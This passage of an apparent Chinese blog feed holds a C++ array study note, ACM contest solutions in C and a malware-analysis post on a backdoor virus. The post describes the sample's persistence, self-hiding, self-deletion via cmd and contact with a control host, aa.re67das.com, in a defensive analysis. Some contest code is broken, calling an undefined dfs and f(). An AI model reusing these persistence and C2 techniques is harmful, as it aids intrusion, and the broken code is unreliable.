class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">## 3.6多维数组</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;多维数组是数组的数组。使用for循环处理多维数组。但是需要注意得是，<span class="params">&lt;font color=#DC143C&gt;</span>我们需要将外层循环的控制变量申明为引用类型，这是为了避免数组被自动转化为指针。<span class="params">&lt;/font&gt;</span></div></pre></td></tr></table></figure></int></p><p>int nums[3][4] = { {1,2,3,4},{5,6,7,8},{9,10,11,12}};<br>for (auto &amp;i : nums)   //外层一定要引用<br>{<br>    for(auto &amp;j:i)   //可以引用，也可以不引用<br>        cout &lt;&lt; j &lt;&lt; endl;<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;对于常见的for循环遍历数组，我们可以采用指针或者函数的方法。</div></pre></td></tr></table></figure></p><p>ia[3][5]={0}<br>for (auto p=ia;p!=ia+3;p++)<br>{<br>    for(auto q=<em>p;q!=</em>p+4;q++)<br>    {<br>        cout&lt;&lt;*q&lt;<endl; }="" <figure="" class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">ia[<span class="number">3</span>][<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;</div><div class="line"><span class="built_in">for</span> (<span class="keyword">auto</span> p=<span class="built_in">begin</span>(ia);p!=<span class="built_in">end</span>(ia);p++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">for</span>(<span class="keyword">auto</span> q=<span class="built_in">begin</span>(*p);q!=<span class="built_in">end</span>(*p);q++)</div><div class="line">&#123;</div><div class="line">cout&lt;&lt;*q&lt;&lt;endl;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">```  </div><div class="line">练习<span class="number">3.43</span></div></pre></td></tr></table></endl;></p><p>int main(void)<br>{<br>    int nums[3][4] = { {1,2,3,4},{5,6,7,8},{9,10,11,12}};<br>    for (auto &amp;i : nums)<br>    {<br>        for(auto j:i)<br>            cout &lt;&lt; j &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int nums[<span class="number">3</span>][<span class="number">4</span>] = &#123; &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;,&#123; <span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> &#125;,&#123; <span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span> &#125; &#125;;</div><div class="line">for (int i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</div><div class="line">&#123;</div><div class="line">for (int j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</div><div class="line">cout &lt;&lt; nums[i][j] &lt;&lt; <span class="string">" "</span>;</div><div class="line">cout &lt;&lt; endl;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int nums[<span class="number">3</span>][<span class="number">4</span>] = &#123; &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;,&#123; <span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> &#125;,&#123; <span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span> &#125; &#125;;</div><div class="line">for (auto *p = begin(nums);p!=end(nums);p++)   <span class="comment">//外层循环控制子数组的遍历，是子数组首地址的值</span></div><div class="line">&#123;</div><div class="line">for (auto *q = begin(*p); q != end(*p); q++)   <span class="comment">//内层循环控制数组元素的遍历</span></div><div class="line">&#123;</div><div class="line">cout &lt;&lt; *q &lt;&lt; <span class="string">" "</span>;</div><div class="line">&#125;</div><div class="line">cout &lt;&lt; endl;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;3-3：标准库类型-vector&quot;&gt;&lt;a href=&quot;#3-3：标准库类型-vector&quot; class=&quot;headerlink&quot; title=&quot;3.3：标准库类型 vector&quot;&gt;&lt;/a&gt;3.3：标准库类型 vector&lt;/h2&gt;&lt;h3 id=&quot;定义和初始化vector&quot;&gt;&lt;a href=&quot;#定义和初始化vector&quot; class=&quot;headerlink&quot; title=&quot;定义和初始化vector&quot;&gt;&lt;/a&gt;定义和初始化vector&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;标准库类型vector表示对象的集合，其中所有对象的类型都相同，vector中容纳着其他对象，所以被称为容器。类似于c语言中的动态数组。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1）引用不能成为vector的元素，因为引用不是对象（引用只是对象的别名）&lt;/li&gt;
&lt;li&gt;2）可以使用花括号初始化每个值&lt;/li&gt;
&lt;li&gt;3）使用括号指定元素个数或者相同元素值&lt;/li&gt;
&lt;li&gt;4）根据类型编译器会决断括号内部含有的信息：vector &lt;string&gt; v7{10}   //V7有10个默认值&lt;/string&gt;&lt;/li&gt;
&lt;li&gt;5) 初始化不准用赋值表达式
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>XUPT-ACM比赛部分题目解析</title>
    <link href="http://yoursite.com/2018/03/18/XUPT-ACM%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/03/18/XUPT-ACM比赛题解/</id>
    <published>2018-03-18T08:02:11.000Z</published>
    <updated>2018-03-25T08:37:02.391Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二次参加由软件科技协会举办的ACM比赛，感觉全程划水，看见大佬在电脑前面啪啪啪（拟声词）的敲着代码，我在旁边懒癌发作吃着干粮。<br><a id="more"></a></p><h2 id="A题：小明坐火车"><a href="#A题：小明坐火车" class="headerlink" title="A题：小明坐火车"></a>A题：小明坐火车</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>  <img src="https://i.imgur.com/EaUWTgC.jpg" alt=""><br>  <img src="https://i.imgur.com/wHgW0Do.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;唯一有坑的地方就是关于每站间隔时间不一定只是大于60min（还有可能大于120，160啥的）<strong>此处有while循环，原谅我思考问题不全面吧。（应该不可原谅）</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span> main(void)</div><div class="line">&#123;</div><div class="line"><span class="built_in">int</span> <span class="built_in">hour</span>,<span class="built_in">min</span>;</div><div class="line"><span class="built_in">int</span> <span class="built_in">n</span>;</div><div class="line"><span class="built_in">int</span> <span class="built_in">time</span>[<span class="number">100</span>];</div><div class="line"><span class="built_in">int</span> i;</div><div class="line">while(scanf(<span class="string">"%d:%d"</span>,&amp;<span class="built_in">hour</span>,&amp;<span class="built_in">min</span>)!=EOF)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;<span class="built_in">n</span>);</div><div class="line">for(i=<span class="number">1</span>;i&lt;<span class="built_in">n</span>;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;<span class="built_in">time</span>[i]);</div><div class="line">&#125;</div><div class="line">for(i=<span class="number">1</span>;i&lt;<span class="built_in">n</span>;i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">min</span>+=<span class="built_in">time</span>[i];</div><div class="line">while(<span class="built_in">min</span>&gt;=<span class="number">60</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">min</span>-=<span class="number">60</span>;</div><div class="line"><span class="built_in">hour</span>+=<span class="number">1</span>;</div><div class="line"><span class="built_in">if</span>(<span class="built_in">hour</span>&gt;=<span class="number">24</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">hour</span>-=<span class="number">24</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"%02d:%02d\n"</span>,<span class="built_in">hour</span>,<span class="built_in">min</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="F题：太阳的后裔"><a href="#F题：太阳的后裔" class="headerlink" title="F题：太阳的后裔"></a>F题：太阳的后裔</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p>   <img src="https://i.imgur.com/LAVYpWW.jpg" alt=""><br>   <img src="https://i.imgur.com/CEXF5z3.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这道题我开始想的是利用遍历的方法，遍历整个数组，如果当前数字是0的话，sum++；同时判断左边和下边的数是否为0，如果为0同样sum++，最后设置该数是2，作为遍历的标志但是，但是，这道题是判断连通域的题，应该用到dfs，深度优先搜索。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所谓深度优先搜索是指：在某个节点上，按照某种顺序不断的向深层次的符合条件的节点递归，遇到不符合条件的逐层返回，知道所有节点都遍历完成。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先判断num数组本身和book标志是否同时为0，如果同时为0，则调用dfs函数进行深度优先搜索。函数内部判断的条件是num和book数组数据是否为0，以及是否处于边界条件之内。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">int N,M;</div><div class="line">int num[500][500];</div><div class="line">int <span class="attribute">sum</span>=0;</div><div class="line">int next[4][2]=&#123;&#123;1,0&#125;,&#123;0,1&#125;,&#123;-1,0&#125;,&#123;0,-1&#125;&#125;;</div><div class="line">int <span class="attribute">max</span>=0;</div><div class="line">int book[500][500]=&#123;0&#125;;</div><div class="line">int qi[1000];</div><div class="line">int qj[1000];</div><div class="line">void bfs(int i,int j)</div><div class="line">&#123;</div><div class="line">int <span class="attribute">t</span>=0;</div><div class="line">int ni,nj;</div><div class="line">int <span class="attribute">wei</span>=0;</div><div class="line">int <span class="attribute">tou</span>=0;</div><div class="line">qi[wei]=i;</div><div class="line">qj[wei]=j;</div><div class="line">book[i][j]=1;</div><div class="line">wei++;</div><div class="line"><span class="attribute">sum</span>=0;</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(<span class="attribute">tou</span>==wei)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(sum&gt;max)</div><div class="line">&#123;</div><div class="line"><span class="attribute">max</span>=sum;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">&#125;</div><div class="line"><span class="attribute">i</span>=qi[tou];</div><div class="line"><span class="attribute">j</span>=qj[tou];</div><div class="line">tou++;</div><div class="line">sum++;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">t</span>=0;t&lt;4;t++)</div><div class="line">&#123;</div><div class="line"><span class="attribute">ni</span>=i+next[t][0];</div><div class="line"><span class="attribute">nj</span>=j+next[t][1];</div><div class="line"><span class="keyword">if</span>(num[ni][nj]==0&amp;&amp;book[ni][nj]==0&amp;&amp;ni&lt;N&amp;&amp;nj&lt;M&amp;&amp;ni&gt;=0&amp;&amp;nj&gt;=0)</div><div class="line">&#123;</div><div class="line">qi[wei]=ni;</div><div class="line">qj[wei]=nj;</div><div class="line">wei++;</div><div class="line">book[ni][nj]=1;</div><div class="line">    &#125;</div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int i,j;</div><div class="line">scanf(<span class="string">"%d %d"</span>,&amp;N,&amp;M);</div><div class="line"><span class="keyword">for</span>(<span class="attribute">i</span>=0;i&lt;N;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">j</span>=0;j&lt;M;j++)</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;num[i][j]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">i</span>=0;i&lt;N;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">j</span>=0;j&lt;M;j++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(num[i][j]==0&amp;&amp;book[i][j]==0)</div><div class="line">&#123;</div><div class="line">dfs(i,j);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"%d"</span>,max);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="K题：黑客帝国"><a href="#K题：黑客帝国" class="headerlink" title="K题：黑客帝国"></a>K题：黑客帝国</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><p>   <img src="https://i.imgur.com/bjDlvbN.jpg" alt=""><br>   <img src="https://i.imgur.com/6auvIzA.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入用数组存储，指令用一个三位数表示，当时每个位数代表着不同的含义，首先我们应该表示同一个数的不同位。<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int a[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">int jc[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">int n=<span class="number">0</span>;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;n);</div><div class="line">int i=<span class="number">0</span>;</div><div class="line">for(i;i&lt;n;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">&#125;</div><div class="line">int sum=<span class="number">0</span>;</div><div class="line">i=<span class="number">0</span>;</div><div class="line">while(<span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">f(a[i]);</div><div class="line">sum++;</div><div class="line">switch(b[<span class="number">0</span>])</div><div class="line">&#123;</div><div class="line">case <span class="number">0</span>:</div><div class="line">if(jc[b[<span class="number">2</span>]]!=<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">i=jc[b[<span class="number">1</span>]];</div><div class="line">continue;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">case <span class="number">1</span>:</div><div class="line">if(b[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;b[<span class="number">2</span>]==<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"%d"</span>,sum);</div><div class="line">     return <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">case <span class="number">2</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=b[<span class="number">2</span>];</div><div class="line">break;</div><div class="line">case <span class="number">3</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]+b[<span class="number">2</span>];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">4</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]*b[<span class="number">2</span>];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">5</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">2</span>]];</div><div class="line">break;</div><div class="line">case <span class="number">6</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]+jc[b[<span class="number">2</span>]];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">7</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]*jc[b[<span class="number">2</span>]];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">8</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=a[jc[b[<span class="number">2</span>]]];</div><div class="line">break;</div><div class="line">case <span class="number">9</span>:</div><div class="line">a[jc[b[<span class="number">2</span>]]]=jc[b[<span class="number">1</span>]];</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;第二次参加由软件科技协会举办的ACM比赛，感觉全程划水，看见大佬在电脑前面啪啪啪（拟声词）的敲着代码，我在旁边懒癌发作吃着干粮。&lt;br&gt;
    
    </summary>
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(5)----骷髅病毒分析</title>
    <link href="http://yoursite.com/2018/03/15/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(5)--%E9%AA%B7%E9%AB%85%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/15/病毒分析技术(5)--骷髅病毒/</id>
    <published>2018-03-15T07:02:11.000Z</published>
    <updated>2018-03-15T10:50:28.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析</li><li>4.详细分析</li><li>5.博客数据：<a href="https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg" target="_blank" rel="external">https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg</a><a id="more"></a><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：样本.exe（脱壳后为样本dump.exe）</li><li>2.md5：5b8bc92296c2fa60fecc6316ad73f1e2</li><li>3.是否加壳：加壳UPX</li><li>4.编译语言：visual C++<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1）通过注册表判断系统是否被感染</li><li>2）获取windows目录，利用计时器实现随机命名，把病毒copy到windows目录实现隐藏</li><li>3）删除样本文件</li><li>4）创建服务，实现自启<br>  <img src="https://i.imgur.com/CyMYcoK.png" alt=""></li><li>5）链接指定url，执行后门行为。<h1 id="四：详细分析"><a href="#四：详细分析" class="headerlink" title="四：详细分析"></a>四：详细分析</h1></li><li>1.PEID查壳，发现是UPX加壳，ESP定律法脱去</li><li>2.病毒先将currentcontrol\services\和15654656链接起来，并且利用RegOpenKey来打开这个注册表。<strong>目的是：判断这个服务是否被创建，换句话说看病毒是否在系统内存在</strong><br>  <img src="https://i.imgur.com/TDe2PVo.png" alt=""><br>  <img src="https://i.imgur.com/nmYnFHu.png" alt=""></li><li>3.如果这个服务不存在，病毒执行405A25，打开服务管理器。然后获取windows目录，比较c://windows，接着通过GetTick来获取计数器，复制那个exe文件到windows目录。<strong>目的是实现自身的隐藏</strong>接着调用CreateService来创建病毒服务。判断服务是否开启，然后开启服务，最后，先获取获取目录信息，接着获取当前进程信息，<strong>目的是获取样本文件的信息，以便为删除做准备</strong>然后调用shellEx利用cmd执行/c del &gt;nul删除样本文件，设置进程的优先级。<strong>以便后续为破坏做准备</strong><br>  <img src="https://i.imgur.com/1HaXven.png" alt=""><br>  <img src="https://i.imgur.com/vrJSZph.png" alt=""><br>  <img src="https://i.imgur.com/Xbdu0Ib.png" alt=""><br>  <img src="https://i.imgur.com/i3Pfono.png" alt=""><br>  <img src="https://i.imgur.com/jZeBk3i.png" alt=""><br>  <img src="https://i.imgur.com/0biAe66.png" alt=""><br>  <img src="https://i.imgur.com/lxmX9bn.png" alt=""><br>  <img src="https://i.imgur.com/M9HE1vi.png" alt=""><br>  <img src="https://i.imgur.com/5qOMwiI.png" alt=""><br>  <img src="https://i.imgur.com/mhuZm92.png" alt=""></li><li>4。如果这个服务存在的话，执行后续操作。</li><li>5.通过调用StartServiceCtrlDispatcher函数，执行线程<br>  <img src="https://i.imgur.com/CKVSX3r.png" alt=""></li><li>6.分析该服务线程<ul><li>1）先获取例如closesocket和SDetServiceStatus等函数的地址<br><img src="https://i.imgur.com/6yBC2VV.png" alt=""></li><li>2）创建一个互斥体，<strong>目的是使系统中只有一个病毒实例在运行</strong></li><li>3）创建一个线程，然后枚举资源列表，更新文件。<ul><li>a)先和”2”一样，打开15654656注册表，判断病毒是否运行成功。<br><img src="https://i.imgur.com/UHPVd37.png" alt=""></li><li>b)获取文件属性，并创建一个文件，读取文件，替换文件资源<br><img src="https://i.imgur.com/4hGTtzJ.png" alt=""><br><img src="https://i.imgur.com/8Hm1wsC.png" alt=""></li><li>c)加载刚刚替换的资源文件hra%u.dll<br><img src="https://i.imgur.com/1IxCgKT.png" alt=""></li></ul></li><li>4）<strong>分析第一个线程：</strong><br><img src="https://i.imgur.com/ZEporSq.png" alt="">   <ul><li>a）获取网络主机名和地址<br><img src="https://i.imgur.com/jXHcdAV.png" alt=""></li><li>b) 比较用户名和密码：<br><img src="https://i.imgur.com/Ew2IpIo.png" alt=""></li><li>c) 获取当前文件路径，并把文件分别复制到C,D,E盘中（E:\g1fd.exe）【调用copyfile函数执行】<br><img src="https://i.imgur.com/WbH7Eu2.png" alt=""></li><li>d) 如果在C,D,E中则会获取当前时间，然后执行程序，否则把文件复制到F盘，然后休眠500ms后创建下个线程.<br><img src="https://i.imgur.com/bFVxqfx.png" alt=""></li></ul></li><li>5）<strong>分析第二个线程：</strong><ul><li>a）初始化网络配置，休眠100ms，获取本地时间，转化为int类型，和20030221比较，如果小于的话，则一直执行，然后创建CreateStartFun线程（本质是调用StartAddress函数）。<br><img src="https://i.imgur.com/MM0CzNY.png" alt=""><br><img src="https://i.imgur.com/qYCbhJ4.png" alt=""></li><li>b)在StartAddress内部先访问一个短地址aa.re67das.com,然后获取IP地址利用socket链接。</li><li>c) 获取机器的基本配置，然后load hra%u.dll<br><img src="https://i.imgur.com/DTmZFvN.png" alt=""></li><li>d) 利用send（）发送刚刚获取的机器信息。<br><img src="https://i.imgur.com/WZbXEtG.png" alt=""></li><li>e) 利用SelectAndRev3这个函数去不断的从服务器端接收控制信息，<br><img src="https://i.imgur.com/U6ZDQ7V.png" alt=""></li><li>f）输入16号控制码：<br><img src="https://i.imgur.com/qCpQebj.png" alt=""></li><li>g）输入18号控制码（行为见脑图）：<br><img src="https://i.imgur.com/LtwjhDq.png" alt=""></li></ul></li><li>6）<strong>分析第三个线程：</strong><ul><li>a)获取本地时间，如果小于2013.02.21则线程不断执行<br><img src="https://i.imgur.com/vcQOwqt.png" alt=""></li><li>b)否则执行线程如c：</li><li>c)如上,分析线程2所示一致。只是比2多了一个文件写入的函数<br><img src="https://i.imgur.com/sFUKHsD.png" alt=""></li></ul></li><li>7）<strong>分析第四个线程：</strong><br><img src="https://i.imgur.com/kKsDusN.png" alt=""><ul><li>a) MainFun4只是比MainFun3多了一个连接特定url的函数，但是这个解密过程没分析出来，但是你可以通过apadns来获取相关信息。<br><img src="https://i.imgur.com/AdRzUDw.png" alt=""><br><img src="https://i.imgur.com/648N38P.png" alt=""></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.详细分析&lt;/li&gt;
&lt;li&gt;5.博客数据：&lt;a href=&quot;https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg&lt;/a&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(4)--U盘病毒</title>
    <link href="http://yoursite.com/2018/03/08/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(4)--U%E7%9B%98%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/08/病毒分析技术(4)--U盘病毒/</id>
    <published>2018-03-08T07:02:11.000Z</published>
    <updated>2018-03-08T10:17:33.028Z</updated>
    
